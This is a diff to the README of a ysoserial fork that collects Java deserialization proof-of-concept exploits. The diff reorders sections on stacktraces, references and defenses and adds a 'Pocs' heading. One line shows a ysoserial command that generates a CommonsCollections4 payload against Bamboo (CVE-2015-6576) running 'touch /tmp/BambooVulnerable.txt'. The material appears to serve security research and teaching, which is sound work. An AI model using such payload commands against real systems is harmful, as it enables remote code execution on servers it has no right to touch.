@@ -2,17 +2,7 @@ Here there are practical examples of the - deserialization of untrusted objects 
 
 This use the ysoserial tool to generate exploits.
 
-# Stacktraces
-https://github.com/EdoardoVignati/ysoserial/tree/master/analyze
-
-See the webpage on https://rawgit.com/EdoardoVignati/ysoserial/master/analyze/index.html
-
-# References and readings
-https://github.com/EdoardoVignati/ysoserial/blob/master/biblio.bib
-
-# Defenses
-https://link.springer.com/chapter/10.1007/978-3-030-00470-5_21
-
+# Pocs
 
 Minimal Example
 ---------------------------------
@@ -69,6 +59,17 @@ Bamboo (CVE-2015-6576)
 	java -jar ysoserial.jar CommonsCollections4 "touch /tmp/BambooVulnerable.txt" > BambooPayload.ser 
   or use the payload inside the folder JBoss
 
+
+# Stacktraces
+https://github.com/EdoardoVignati/ysoserial/tree/master/analyze
+
+See the webpage on https://rawgit.com/EdoardoVignati/ysoserial/master/analyze/index.html
+
+# References and readings
+https://github.com/EdoardoVignati/ysoserial/blob/master/biblio.bib
+
+# Defenses
+https://link.springer.com/chapter/10.1007/978-3-030-00470-5_21
 
 
 Other references:
